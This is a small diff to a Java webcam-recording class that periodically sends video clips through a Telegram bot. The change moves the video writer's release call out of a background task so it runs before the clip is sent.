@@ -12,6 +12,7 @@ import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;
 
 import javax.swing.*;
 import java.awt.*;
+import java.io.IOException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -100,8 +101,8 @@ public class CameraAccess {
 
                         //every 300 iterations ~ every 10 seconds
                         if (loopCounter % 300 == 0) {
+                            writer.release();
                             executorService.submit(() -> {
-                                writer.release();
                                 bot.sendVideo();
                                 /*ProcessBuilder builder = new ProcessBuilder("rundll32", "user32.dll,LockWorkStation");
                                 builder.inheritIO();
